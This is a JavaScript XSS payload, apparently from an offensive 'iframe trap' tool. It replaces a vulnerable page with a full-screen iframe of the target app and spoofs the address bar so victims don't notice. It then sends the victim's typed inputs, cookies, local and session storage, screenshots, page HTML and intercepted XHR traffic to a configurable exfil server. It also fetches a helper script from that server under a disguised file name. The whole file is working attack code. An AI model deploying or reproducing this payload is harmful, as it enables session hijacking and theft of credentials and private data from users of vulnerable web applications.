//alert('Ready to launch trap?');





// *******************************************************************************

function initGlobals()
{
	console.log("Initializing globals...");
	// Ue fullscreen for actual prod usage
	// not fullscreen shows the XSS laden landing

	// page in the background so you can 
	// tell if you're still where you need to be during
	// development. 
	window.taperfullscreenIframe = true; // Set to true for production use, false for dev
	// Whether or not to copy screenshots to background
	// Can make transitions smoother. Sometimes the
	// background page of the iFrame trap flashes through
	// when navigating the app. This hides that a bit
	// by copying the image to the background
	window.tapersetBackgroundImage = false;

	// What page in the application to start users in
	// Note that if the trap is loading from
	// a reload, it hopefully will automatically
	// load the page the user was on in the iframe
	// when they reloaded the page. Otherwise,
	// they'll start here
	//window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
	window.taperstartingPage = "https://localhost:8443/";



	// Exfil server
	window.taperexfilServer = "https://127.0.0.1:8444";

	// Should we exfil the entire HTML code?
	window.taperexfilHTML = true;

	
	// Should we try to monkey patch underlying API prototypes?
	window.monkeyPatchAPIs = true;


	// Helpful variables
	window.taperlastFakeUrl = "";


	// Slow down the html2canvas
	window.taperloaded = false;


	// Client session
	window.tapersessionName = "";

	// Cookie storage
	window.tapercookieStorageDict = {};


	// Local storage
	window.taperlocalStorageDict = {};


	// Session storage
	window.tapersessionStorageDict = {};
}



// function cleanup(){
//  		sessionStorage.removeItem("taperClaimAlpha");
// }


function canAccessIframe(iframe) {
	try {
		return Boolean(iframe.contentDocument);
	}
	catch(e){
		return false;
	}
}


// Generate a session identifier
function initSession()
{
		// Values for client session identifiers
	const AdjectiveList = [
		"funky",
		"smelly",
		"skunky",
		"merry",
		"whimsical",
		"amusing",
		"hysterical",
		"bumfuzzled",
		"bodacious",
		"absurd",
		"animated",
		"brazen",
		"cheesy",
		"clownish",
		"confident",
		"crazy",
		"cuckoo",
		"deranged",
		"ludicrous",
		"playful",
		"quirky",
		"screwball",
		"slapstick",
		"wacky",
		"excited",
		"humorous",
		"charming",
		"confident",
		"fanatical"
		];

	const ColorList = [
		"blue",
		"red",
		"green",
		"white",
		"black",
		"brown",
		"azure",
		"pink",
		"yellow",
		"silver",
		"purple",
		"orange",
		"grey",
		"fuchsia",
		"crimson",
		"lime",
		"plum",
		"olive",
		"cyan",
		"ivory",
		"magenta"
		];

	const MurderCritter = [
		"kangaroo",
		"koala",
		"dropbear",
		"wombat",
		"wallaby",
		"dingo",
		"emu",
		"tassiedevil",
		"platypus",
		"salty",
		"kookaburra",
		"boxjelly",
		"blueringoctopus",
		"taipan",
		"stonefish",
		"redback",
		"cassowary",
		"funnelwebspider",
		"conesnail"
		];


	var adjective = AdjectiveList[Math.floor(Math.random()*AdjectiveList.length)];
	var color = ColorList[Math.floor(Math.random()*ColorList.length)];
	var murderer = MurderCritter[Math.floor(Math.random()*MurderCritter.length)];
	tapersessionName = adjective + "-" + color + "-" + murderer;
}



// Snag a screenshot and ship it
function sendScreenshot()
{
	if (taperloaded == false)
	{
		console.log("!!! Waiting 3 seconds to init html2canvas!");
		setTimeout(function () {}, 3000);
		taperloaded = true;
	}
	// console.log("---Snagging screenshot...");

	html2canvas(document.getElementById("iframe_a").contentDocument.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
	{
		function responseHandler() 
		{
			console.log(this.responseText)
		};

		//console.log("About to send image....");
		request = new XMLHttpRequest();request.addEventListener("load", responseHandler);
		request.open("POST", taperexfilServer + "/loot/screenshot/" + tapersessionName);


		// Helps hide flashing of the page when clicking around
		if (tapersetBackgroundImage)
		{
			document.body.style.backgroundImage = 'url('+canvas.toDataURL("image/png")+')';
			document.body.style.backgroundRepeat = "no-repeat";
			document.body.style.backgroundSize = "auto";
		}


		canvas.toBlob((blob) => 
		{
			const image = blob;
			request.send(image);
		});
	}).catch(e => console.log(e));
}





// Hook all the inputs so we can capture what was typed
// Called a lot to make sure we don't miss some input
// Code checks (attributes) makes sure we don't register 
// events multiple times
function hookInputs()
{
	inputs = document.getElementById("iframe_a").contentDocument.getElementsByTagName('input');
	for (index = 0; index < inputs.length; index++)
	{
		// Check to see if we've already hooked the input field. 
		// We can just use our own custom attribute to track, if it's
		// already hooked then skip it. If that attribute is missing, something happened
		// like a page change, but maybe the actual URL didn't change. 
		if (inputs[index].getAttribute("tappedState") != "true")
		{
			//console.log("!! Setting tappedState attribute on element index: " + index);
			inputs[index].setAttribute("tappedState", "true");

			// Adding event listeners to fire when the value in submitted 
			addEventListener(inputs[index], (event) => updateInput);
			inputs[index].addEventListener("change", function(){
				inputName = this.name;
				inputValue = this.value;
				request = new XMLHttpRequest();
				request.open("POST", taperexfilServer + "/loot/input/" + tapersessionName);
				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
				var jsonObj = new Object();
				jsonObj["inputName"] = inputName;
				jsonObj["inputValue"] = inputValue;
				var jsonString = JSON.stringify(jsonObj);
				request.send(jsonString);
			});
		}
	}
}



// Check for cookies, see if values
// have been added or changed
// Only update backend if new cookie or value changed.
function checkCookies()
{
	cookieArray = document.cookie.split(';');
	for (index = 0; index < cookieArray.length; index++)
	{
		// console.log("++ Cookie loop: " + index);
		cookieData = cookieArray[index].split('=');
		// console.log("cookieName: " + cookieData[0]);
		// console.log("cookieValue: " + cookieData[1]);

		cookieName = cookieData[0];
		cookieValue = cookieData[1];

		if (cookieName.length === 0)
		{
			continue;
		}


		// console.log("!!!!!   Checking cookies for: " + cookieName + ", " + cookieValue);
		if (cookieName in tapercookieStorageDict)
		{
			// console.log("== Existing cookie: " + cookieName);
			if (tapercookieStorageDict[cookieName] != cookieValue)
			{
				// Existing cookie, but the value has changed
				// console.log("     New cookie value: " + cookieValue);
				// console.log("     Old cookie value: " + cookieStorageDict[cookieName]);
				tapercookieStorageDict[cookieName] = cookieValue;
			}
			else
			{
				// Existing cookie, but no change in value to report
				// console.log("     Cookie value unchanged");
				continue;
			}
		}
		else 
		{
			// New cookie detected
			// console.log("++ New cookie: " + cookieName + ", with value: " + cookieValue);
			tapercookieStorageDict[cookieName] = cookieValue;
		}

		// Ship it
		request = new XMLHttpRequest();
		request.open("POST", taperexfilServer + "/loot/dessert/" + tapersessionName);
		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
		var jsonObj = new Object();
		jsonObj["cookieName"] = cookieName;
		jsonObj["cookieValue"] = cookieValue;
		var jsonString = JSON.stringify(jsonObj);
		request.send(jsonString);
	}
}


// Check for local storage data, see if values
// have been added or changed
// Only update backend if new data or value changed.
function checkLocalStorage()
{
	for (index = 0; index < localStorage.length; index++)
	{
		key = localStorage.key(index)
		value = localStorage.getItem(key)
		//console.log("~~~ Local storage: {" + key + ", " + value + "}");

		if (key in taperlocalStorageDict)
		{
			// Existing local storage key
			//console.log("!!! Existing localstorage key...");
			if (taperlocalStorageDict[key] != value)
			{
				// Existing localStorage, but the value has changed
				// console.log("     New localStorage value: " + value);
				// console.log("     Old localStorage value: " + localStorageDict[key]);
				taperlocalStorageDict[key] = value;
			}
			else
			{
				// Existing cookie, but no change in value to report
				//console.log("     localStorgae value unchanged");
				continue;
			}

		}
		else
		{
			// New localStorage entry
			//console.log("++ New localStorage: " + key + ", with value: " + value);
			taperlocalStorageDict[key] = value;
		}


		// Ship it
		request = new XMLHttpRequest();
		request.open("POST", taperexfilServer + "/loot/localstore/" + tapersessionName);
		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
		var jsonObj = new Object();
		jsonObj["key"] = key;
		jsonObj["value"] = value;
		var jsonString = JSON.stringify(jsonObj);
		request.send(jsonString);
	}
}



// Check for session storage data, see if values
// have been added or changed
// Only update backend if new data or value changed.
function checkSessionStorage()
{
	console.log("!!! Top of checkSessionStorage...");
	for (index = 0; index < sessionStorage.length; index++)
	{
		key = sessionStorage.key(index)
		value = sessionStorage.getItem(key)
		console.log("~~~ Session storage: {" + key + ", " + value + "}");

		if (key in tapersessionStorageDict)
		{
			// Existing local storage key
			console.log("!!! Existing localstorage key...");
			if (tapersessionStorageDict[key] != value)
			{
				// Existing localStorage, but the value has changed
				 // console.log("     New sessionStorage value: " + value);
				 // console.log("     Old sessionStorage value: " + sessionStorageDict[key]);
				tapersessionStorageDict[key] = value;
			}
			else
			{
				// Existing sessionStorage, but no change in value to report
				// console.log("     sessionStorage value unchanged");
				continue;
			}

		}
		else
		{
			// New localStorage entry
			// console.log("++ New sessionStorage: " + key + ", with value: " + value);
			tapersessionStorageDict[key] = value;
		}


		// Ship it
		request = new XMLHttpRequest();
		request.open("POST", taperexfilServer + "/loot/sessionstore/" + tapersessionName);
		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
		var jsonObj = new Object();
		jsonObj["key"] = key;
		jsonObj["value"] = value;
		var jsonString = JSON.stringify(jsonObj);
		request.send(jsonString);
	}
}



// Optional, copy the entire HTML and send out
function sendHTML()
{
	trapURL  = document.getElementById("iframe_a").contentDocument.location.href;
	trapHTML = document.getElementById("iframe_a").contentDocument.documentElement.outerHTML;

	request = new XMLHttpRequest();
	request.open("POST", taperexfilServer + "/loot/html/" + tapersessionName);
	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
	var jsonObj = new Object();
	jsonObj["url"] = trapURL;
	jsonObj["html"] = trapHTML;
	var jsonString = JSON.stringify(jsonObj);
	request.send(jsonString);
}





// When this update fires, it checks the iframe trap URL
// where the user thinks they are, then does a lot of things
// Steals inputs, URL, screenshots, etc. 
// Also updates their browser address bar so they 
// think they're on the page they're viewing in the
// iframe trap, not the one with the XSS vuln. 
function runUpdate()
{
	// iFrame trap disable code
	if (!canAccessIframe(document.getElementById("iframe_a")))
	{
		// If we can't access the iframe anymore, that 
		// means the iframe has changed origin. They 
		// surfed away to a new domain, probably through a link
		// 
		// This is bad, the new page won't load in the iframe trap
		// and will throw very obvious errors on their page
		// indicating something isn't right  
		//
		// Safest thing is the kill the iframe trap and hope
		// no one notices. We'll reload the parent page to the current 
		// iframe page. It'll seem like clicking the link to the 
		// external page didn't work, but the second click will. 
		// First click exits the iframe, reloads the normally. 
		// Second click will properly load the external page. 
		// Sad to lose the trap through. 
		window.location = taperlastFakeUrl;
	}



	var fakeUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
	var fullUrl = document.getElementById("iframe_a").contentDocument.location.href;
	// console.log("$$$ Location: " + document.getElementById("iframe_a").contentDocument.location);
	// console.log("$$$ Path: " + document.getElementById("iframe_a").contentDocument.location.pathname);
	// console.log("$$$ href: " + document.getElementById("iframe_a").contentDocument.location.href);

	// New page, let's steal stuff
	if (taperlastFakeUrl != fakeUrl)
	{
		// Handle URL recording
		console.log("New trap URL, stealing the things: " + fakeUrl);
		taperlastFakeUrl = fakeUrl;

		// This needs an API call to report the new page
		// and take a screenshot maybe, not sure if
		// screenshot timing will be right yet
		request = new XMLHttpRequest();
		request.open("POST", taperexfilServer + "/loot/location/" + tapersessionName);
		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
		
		var jsonObj = new Object();
		jsonObj["url"] = fullUrl;
		var jsonString = JSON.stringify(jsonObj);
		request.send(jsonString);


		// We need to wait until the ifram has loaded to
		// do HTML based looting. 
		document.getElementById("iframe_a").onload = function() {
			// console.log("+++ Onload ready!");

			// Fake the URL that the user sees. This is important. 
			window.history.replaceState(null, '', fakeUrl);

			// Handle input scraping
			hookInputs();

			// Handle screenshotting
			sendScreenshot();


			// Exfil HTML code
			if (taperexfilHTML)
			{
				sendHTML();
			}
		}
	}


	// Updates that need to happen constantly
	// hooking inputs, we can miss them otherwise
	// hookInputs intelligently knows whether inputs
	// need to be rehooked or not
	hookInputs();


	// Handle Cookies
	// Will only report when new cookies found, or values change. 
	checkCookies();


	// Check local storage
	// Will only report when new or changed data found
	checkLocalStorage();


	// Check session storage
	// Will only report when new or changed data found
	checkSessionStorage();

	// Fake the URL that the user sees. This is important. 
	window.history.replaceState(null, '', fakeUrl);
}





// Fetch API wrapper for monkey patching
function customFetch(url, options)
{
	console.log("** Cloned Fetch API call**");
	console.log("Fetch url: " + url);
	console.log("Fetch method: " + options.method);
	console.log("Fetch headers: " + JSON.stringify(options.headers));

	// Clone request
	return fetch(url, options).then((response) => {
		// clone response
		return response.clone().text().then((body) => {
     		console.log('Response Status:', response.status);
      		console.log('Response Headers:', response.headers);
        	console.log('Response Body:', body);

        	return response;
		});
	})
	.catch((error) => {
		console.error('Error:', error);
		throw error;
	});
}



// Monkey patch API prototypes to intercept API calls
function monkeyPatch()
{
	console.log("** Enabling API monkey patches...");

	// XHR Part
	const xhrOriginalOpen      = window.XMLHttpRequest.prototype.open;
	const xhrOriginalSetHeader = window.XMLHttpRequest.prototype.setRequestHeader;
	const xhrOriginalSend      = window.XMLHttpRequest.prototype.send;



	//Monkey patch open
	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.open = function(method, url, async, user, password) 
	{
		var method = arguments[0];
		var url = arguments[1];

		console.log("Intercepted XHR open: " + method + ", " + url);


		// send loot
		request = new XMLHttpRequest();
		request.open("POST", taperexfilServer + "/loot/xhrOpen/" + tapersessionName);
		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");

		var jsonObj = new Object();
		jsonObj["method"] = method;
		jsonObj["url"]    = url;
		var jsonString    = JSON.stringify(jsonObj);
		request.send(jsonString);
	

		xhrOriginalOpen.apply(this, arguments);
	}



	// Monkey patch setRequestHeader
	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.setRequestHeader = function (header, value)
	{
		var header = arguments[0];
		var value  = arguments[1];

		// console.log("$$$ MonekeyURL: " + this.url);

		console.log("Intercepted Header = " + header + ": " + value);


		request = new XMLHttpRequest();
		request.open("POST", taperexfilServer + "/loot/xhrSetHeader/" + tapersessionName);
		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");

		var jsonObj = new Object();
		jsonObj["header"] = header;
		jsonObj["value"]  = value;
		var jsonString    = JSON.stringify(jsonObj);
		request.send(jsonString);


		xhrOriginalSetHeader.apply(this, arguments);
	}


  	// Monkey patch send
	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.send = function(data) 
	{
		console.log("Intercepted request body: " + data);

		var requestBody = btoa(data);


		this.onreadystatechange = function()
		{
			if (this.readyState === 4)
			{
				var data;

				if (!this.responseType || this.responseType === "text") 
				{
					data = this.responseText;
				} 
				else if (this.responseType === "document") 
				{
					data = this.responseXML;
				} 
				else if (this.responseType === "json") 
				{
					data = JSON.stringify(this.response);
				} 
				else 
				{
					data = xhr.response;
				}

				var responseBody = btoa(data);
				// var response = read_body(this);
				console.log("Intercepted response: " + data);

				request = new XMLHttpRequest();
				request.open("POST", taperexfilServer + "/loot/xhrCall/" + tapersessionName);
				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");

				var jsonObj = new Object();
				jsonObj["requestBody"]  = requestBody;
				jsonObj["responseBody"] = responseBody;
				var jsonString          = JSON.stringify(jsonObj);
				request.send(jsonString);
			}
		};

		xhrOriginalSend.apply(this, arguments);
	}


	console.log("## Starting fetch monkey patching");
	// Fetch API monkey patching
	const originalFetch = window.fetch;


	document.getElementById("iframe_a").contentWindow.fetch = customFetch;
	// window.fetch = customFetch;
}




// Start the trap
function takeOver()
{

	//document.body.style.backgroundColor = "pink";
	//document.innerHTML = "";

	// Setup our iframe trap
	var iframe = document.createElement("iframe");
	iframe.setAttribute("src", taperstartingPage);
	iframe.setAttribute("style", "border:none");

	if (taperfullscreenIframe)
	{
		console.log("&& Using fullscreen");
		iframe.style.width  = "100%";
		iframe.style.height = "100%";
		iframe.style.top = "0px";
		iframe.style.left = "0px"
	}
	else
	{
		console.log("&& Using partial screen");
		iframe.style.width  = "80%";
		iframe.style.height = "80%";
		iframe.style.top = "50px";
		iframe.style.left = "50px";
	}
	iframe.style.position = "fixed";
	iframe.id = "iframe_a";
	document.body.appendChild(iframe);

	// Monkey patch underlaying API calls?
	if (window.monkeyPatchAPIs)
	{
		monkeyPatch();
	}



	// Hook needed events below...

	// Just register all the darned events, each event in the iframe
	// we'll call runUpdate()
	var myIframe = document.getElementById('iframe_a');

	// Hook all the things for URL faking
	for(var key in myIframe){
		if(key.search('on') === 0) {
			myIframe.addEventListener(key.slice(2), runUpdate);
		}
	}

}





// ********************************************
// Go time




//if (sessionStorage.getItem("taperClaimDebug")===null)
if (window.taperClaimDebug != true)
{
	//sessionStorage.setItem("taperClaimDebug","optional");
	window.taperClaimDebug = true;
	//localStorage.setItem('trapLoaded', 'true');

	// window.addEventListener("visibilitychange", function(e){
	// 	cleanup();
	// });
	// window.addEventListener("beforeunload", function(e){
	// 	cleanup();
	// });

	
	initGlobals();

	console.log("!!!! Loading payload!");
// Blank the page so it doesn't show through as users 
// navigate inside the iframe
	document.body.innerHTML = "";
	document.body.outerHTML = "";


// Pull in html2canvas
	var js = document.createElement("script");
	js.type = "text/javascript";
	js.src = taperexfilServer + "/lib/telemhelperlib.js";

	this.temp_define = window['define'];
	document.body.appendChild(js);
	window['define'] = undefined;

	// document.body.appendChild(js);
	// document.write('<script type="text/javascript" src="http://localhost:8444/lib/telemhelperlib.js"></script>');
	console.log("HTML2CANVAS added to DOM");


// Pull in jszip
// js = document.createElement("script");
// js.type = "text/javascript";
// js.src = "http://localhost:8444/lib/compress.js";
// document.body.appendChild(js);


// Pick our session ID
	initSession();


// Trap all the things
	takeOver();


}
else
{
	console.log("++++++ Already loaded payload!");
}



